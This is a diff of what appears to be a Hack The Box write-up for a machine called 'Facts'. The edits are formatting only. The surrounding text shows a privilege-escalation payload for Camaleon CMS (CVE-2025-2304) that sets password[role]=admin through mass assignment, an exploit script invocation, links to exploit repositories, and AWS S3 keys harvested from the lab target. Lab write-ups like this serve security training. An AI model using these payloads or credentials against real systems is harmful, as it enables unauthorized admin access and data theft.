@@ -73,13 +73,13 @@ feroxbuster -u http://facts.htb -s 200 300 302
 <br>
 ## It seems the website is running a vulnerable version of Cameleon CMS
 ## We can take advantage and exploit this !
-
+![img]({{ '/assets/images/facts/exploit-facts.png' | relative_url }}){: .center-image }
 
 ## Useful links:
 ## [github.com/CsuriBird/CVE-2025-2304](https://github.com/CsuriBird/CVE-2025-2304/tree/main?trk=article-ssr-frontend-pulse_little-text-block)
 ## [linkedin.com/pulse/cve-2025-2304-camaleon-cms](https://www.linkedin.com/pulse/cve-2025-2304-camaleon-cms-290-privilege-escalation-adam-v-wtaqe)
 
-Essentially because permit! allows all keys under password, an attacker can send:
+## Essentially because permit! allows all keys under password, an attacker can send:
 
 {% highlight bash %}
     password[password]
@@ -117,7 +117,7 @@ password[role]=admin&_method=patch
 {% endhighlight bash %}
 
 
-Then URL encoded if necessary:
+## Then URL encoded if necessary:
 
 {% highlight bash %}
 &password%5Brole%5D=admin
@@ -178,14 +178,14 @@ python3 exp.py http://facts.htb <created_user> <created_user_password>
 
 ![img]({{ '/assets/images/facts/13-facts.png' | relative_url }}){: .center-image }
 
-
+{% highlight bash %}
 Aws s3 access key (*)  - AKIAC393BF8B045D05C7
 Aws s3 secret key (*) - VvcbKhlXTSEgwW3sDV8wJ2u1XIJiPfWp+Fk6oAfr
 Aws s3 bucket name (*) - randomfacts
 Aws s3 region (*) - us-east-1
 Aws s3 bucket endpoint - http://localhost:54321
 Cloudfront url - http://facts.htb/randomfacts
-
+{% endhighlight bash %}
 
 ## You can also find a quick script to automate the role escalation and credential harvesting here:
 [github.com/Alien0ne/CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304)
